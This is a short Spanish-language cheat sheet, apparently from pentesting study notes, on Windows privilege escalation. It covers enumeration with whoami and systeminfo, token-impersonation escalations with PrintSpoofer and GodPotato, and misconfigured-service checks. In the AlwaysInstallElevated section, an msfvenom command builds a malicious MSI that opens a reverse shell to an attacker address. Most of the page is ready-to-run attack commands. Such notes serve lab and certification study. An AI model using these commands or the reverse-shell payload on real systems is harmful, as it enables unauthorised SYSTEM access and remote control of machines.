---
title: Escalada en Windows
order: 2
description: Vectores de privesc en Windows — privilegios de token, servicios mal configurados, AlwaysInstallElevated y enumeración.
---

## Enumeración

```powershell wrap=false
whoami /priv
whoami /groups
systeminfo
```

Automatiza con **winPEAS** o `PowerUp.ps1`.

## Privilegios de token

`SeImpersonatePrivilege` permite escaladas tipo *Potato*:

```powershell wrap=false
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "cmd /c whoami"
```

## Servicios mal configurados

Servicios con permisos de escritura o rutas sin comillas:

```powershell wrap=false
sc qc nombreServicio
accesschk.exe -uwcqv "Everyone" *
```

## AlwaysInstallElevated

Si ambas claves están a 1, cualquier `.msi` se instala como SYSTEM:

```powershell wrap=false
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o evil.msi
```
